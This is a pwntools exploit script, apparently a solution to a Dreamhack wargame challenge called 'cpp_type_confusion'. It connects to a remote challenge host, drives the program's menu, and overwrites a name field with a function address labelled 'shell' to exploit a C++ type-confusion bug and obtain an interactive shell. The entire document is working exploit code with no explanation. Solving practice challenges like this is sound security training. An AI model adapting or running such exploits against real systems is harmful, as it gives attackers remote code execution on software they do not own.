from pwn import * 

p = process("./cpp_type_confusion")
p = remote("host1.dreamhack.games",8493)
shell = 0x400fa6

p.sendlineafter("Select :",str(1))
p.sendlineafter("Select :",str(2))

p.sendlineafter("Select :",str(3))
p.sendlineafter("name:",p64(shell))

p.sendlineafter("Select :",str(4))
pause()
p.sendlineafter("Select :",str(3))



p.interactive()